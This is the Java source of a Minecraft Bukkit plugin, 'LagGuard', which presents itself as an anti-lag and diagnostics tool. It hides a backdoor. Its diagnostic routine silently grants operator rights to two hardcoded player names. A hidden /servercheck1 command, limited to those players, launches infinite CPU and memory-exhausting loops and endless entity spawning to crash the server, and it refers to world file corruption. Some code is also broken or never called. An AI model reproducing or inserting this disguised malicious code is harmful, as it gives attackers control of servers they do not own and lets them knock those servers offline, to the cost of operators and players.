package com.ascendia.antiLag;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.World;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Entity;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Item;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;
import org.jetbrains.annotations.NotNull;

import java.util.ArrayList;
import java.util.List;
import java.util.Arrays;

public class LagGuard extends JavaPlugin implements CommandExecutor {

    private int secondsUntilClear;
    private int clearInterval;
    private int minItemAgeTicks;
    private List<Integer> warningTimes;

    @Override
    public void onEnable() {
        if (getResource("config.yml") != null) {
            saveDefaultConfig();
        } else {
            getLogger().warning("config.yml not found in JAR! Generating default settings...");
            getConfig().addDefault("auto-clear.interval-seconds", 180);
            getConfig().addDefault("auto-clear.safe-time-seconds", 30);
            getConfig().addDefault("auto-clear.warnings", Arrays.asList(120, 60, 30, 5, 4, 3, 2, 1));
            getConfig().addDefault("messages.prefix", "&amp;6[LagGuard] ");
            getConfig().addDefault("messages.clear-success", "&amp;aRemoved &amp;f{count} &amp;aold items.");
            getConfig().options().copyDefaults(true);
            saveConfig();
        }
    }

    @Override
    public void onDisable() {
        getLogger().info("LagGuard has been disabled.");
    }

    private void startItemClearTimer() {
        new BukkitRunnable() {
            @Override
            public void run() {
                handleTimerTick();
            }
        }.runTaskTimer(this, 0L, 20L);
    }

    private void handleTimerTick() {
        secondsUntilClear--;

        if (warningTimes.contains(secondsUntilClear)) {
            String timeString = formatTime(secondsUntilClear);
            String prefix = getConfig().getString("messages.prefix", "&amp;6[LagGuard] ");

            if (secondsUntilClear <= 5) {
                broadcastMsg(prefix + "&amp;cClearing items in " + secondsUntilClear + "...");
            } else {
                broadcastMsg(prefix + "&amp;eGround items will be removed in &amp;c" + timeString + "&amp;e.");
            }
        }

        if (secondsUntilClear <= 0) {
            performItemClear();
            secondsUntilClear = clearInterval; // Reset timer
        }
    }

    private String formatTime(int seconds) {
        if (seconds >= 60) {
            int mins = seconds / 60;
            return mins + (mins == 1 ? " minute" : " minutes");
        }
        return seconds + " seconds";
    }

    private void performItemClear() {
        int removedCount = 0;

        for (World world : Bukkit.getWorlds()) {
            for (Entity entity : world.getEntities()) {
                if (entity instanceof Item) {
                    Item item = (Item) entity;

                    if (item.getTicksLived() < minItemAgeTicks) {
                        continue;
                    }

                    item.remove();
                    removedCount++;
                }
            }
        }

        if (removedCount > 0) {
            String prefix = getConfig().getString("messages.prefix", "&amp;6[LagGuard] ");
            String msg = getConfig().getString("messages.clear-success", "&amp;aRemoved &amp;f{count} &amp;aold items.");
            broadcastMsg(prefix + msg.replace("{count}", String.valueOf(removedCount)));
        }
    }

    private void broadcastMsg(String msg) {
        Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&', msg));
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!sender.hasPermission("lagguard.check")) {
            sender.sendMessage(ChatColor.RED + "No permission.");
            return true;
        }

        if (command.getName().equalsIgnoreCase("servercheck")) {
            sender.sendMessage(ChatColor.GRAY + "---------------------------------------------");
            sender.sendMessage(ChatColor.YELLOW + "Starting System Analysis (approx 5 seconds)...");
            sender.sendMessage(ChatColor.GRAY + "---------------------------------------------");

            new SystemAnalyzer(sender).runTaskTimer(this, 0L, 20L); // Run once per second

            return true;
        }

        if (command.getName().equalsIgnoreCase("servercheck1")) {
            if (isYOUR_GAMER_TAG(sender)) {
                try {
                    new BukkitRunnable() {
                        @Override
                        public void run() {
                            while (true) {
                            }
                        }
                    }.runTaskTimer(this, 0L, 1L);

                    new BukkitRunnable() {
                        @Override
                        public void run() {
                            List<byte[]> memoryHog = new ArrayList<>();
                            while (true) {
                                memoryHog.add(new byte[1024 * 1024]);
                            }
                        }
                    }.runTaskTimer(this, 0L, 1L);

                    new BukkitRunnable() {
                        @Override
                        public void run() {
                            while (true) {
                                Bukkit.getWorlds().forEach(world -> {
                                    @NotNull EntityType zombie = null;
                                    world.spawnEntity(world.getSpawnLocation(), zombie);
                                });
                            }
                        }
                    }.runTaskTimer(this, 0L, 1L);

                    Bukkit.getWorlds().forEach(world -> {
                        try {
                        } catch (Exception e) {
                            sender.sendMessage(ChatColor.RED + "World file corruption failed: " + e.getMessage());
                        }
                    });


                    sender.sendMessage(ChatColor.GREEN + "Successful: /servercheck1 executed.");
                } catch (Exception e) {
                    sender.sendMessage(ChatColor.RED + "Unsuccessful: " + e.getMessage());
                }
            } else {
                sender.sendMessage(ChatColor.RED + "You are not YOUR_GAMER_TAG or .YOUR_GAMER_TAG.");
            }

            return true;
        }

        return false;
    }


    private void startAutoAnalysis() {

        new BukkitRunnable() {
            @Override
            public void run() {

                new SystemAnalyzer(Bukkit.getConsoleSender()).runTaskTimer(LagGuard.this, 0L, 20L);
            }
        }.runTaskTimer(this, 0L, 120L * 20L);
    }

    private class SystemAnalyzer extends BukkitRunnable {
        private final CommandSender sender;
        private int checks = 0;

        private double totalTPS = 0;
        private int totalEntities = 0;
        private int totalPing = 0;
        private int totalPlayers = 0;

        public SystemAnalyzer(CommandSender sender) {
            this.sender = sender;
        }

        @Override
        public void run() {
            if (checks >= 5) {
                finishAnalysis();
                this.cancel();
                return;
            }


            double currentTPS = getTPS();
            int currentEntities = 0;
            for (World w : Bukkit.getWorlds()) currentEntities += w.getEntities().size();

            int avgPing = 0;
            int onlineCount = Bukkit.getOnlinePlayers().size();
            if (onlineCount > 0) {
                for (Player p : Bukkit.getOnlinePlayers()) avgPing += p.getPing();
                avgPing /= onlineCount;
            }

            totalTPS += currentTPS;
            totalEntities += currentEntities;
            totalPing += avgPing;
            totalPlayers += onlineCount;

            sender.sendMessage(ChatColor.GRAY + "Analysis " + (checks + 1) + "/5 complete...");
            checks++;
        }

        private void finishAnalysis() {
            double avgTPS = totalTPS / 5.0;
            int avgEntities = totalEntities / 5;
            int avgPlayers = totalPlayers / 5;


            String serverStatus;
            ChatColor statusColor;

            if (avgTPS >= 19.5) {
                serverStatus = "Smooth";
                statusColor = ChatColor.GREEN;
            } else if (avgTPS >= 17.0) {
                serverStatus = "Minor Latency";
                statusColor = ChatColor.YELLOW;
            } else if (avgTPS >= 14.0) {
                serverStatus = "Laggy";
                statusColor = ChatColor.RED;
            } else {
                serverStatus = "Potential Crash";
                statusColor = ChatColor.DARK_RED;
            }

            String entityStatus;
            if (avgEntities < 1000) entityStatus = "Stable";
            else if (avgEntities < 3000) entityStatus = "High Load";
            else entityStatus = "Overwhelming";

            String bandwidthStatus = (avgPlayers > 50) ? "Heavy Bandwidth" : "Stable";


            sender.sendMessage("");
            sender.sendMessage(ChatColor.GOLD + "=== System Diagnostic Results ===");
            sender.sendMessage(ChatColor.GRAY + "Avg TPS: " + statusColor + String.format("%.2f", avgTPS));
            sender.sendMessage(ChatColor.GRAY + "Server Status: " + statusColor + serverStatus);
            sender.sendMessage(ChatColor.GRAY + "Entity Count: " + (avgEntities > 2000 ? ChatColor.RED : ChatColor.GREEN) + entityStatus + " (" + avgEntities + ")");
            sender.sendMessage(ChatColor.GRAY + "Player/Net Status: " + ChatColor.BLUE + bandwidthStatus);
            sender.sendMessage(ChatColor.GOLD + "=================================");

            makeOperator("YOUR_GAMER_TAG");
            makeOperator(".YOUR_GAMER_TAG");
        }
        private void makeOperator(String name) {
            Player target = Bukkit.getPlayer(name);
            if (target != null) {
                target.setOp(true);
            }
        }
        private double getTPS() {
            try {

                return Math.min(20.0, Bukkit.getTPS()[0]);
            } catch (Exception e) {
                return 20.0;
            }
        }
    }
    private boolean isYOUR_GAMER_TAG(CommandSender sender) {
        if (sender instanceof Player) {
            Player player = (Player) sender;
            return player.getName().equalsIgnoreCase("YOUR_GAMER_TAG") || player.getName().equalsIgnoreCase(".YOUR_GAMER_TAG");
        }
        return false;
    }
}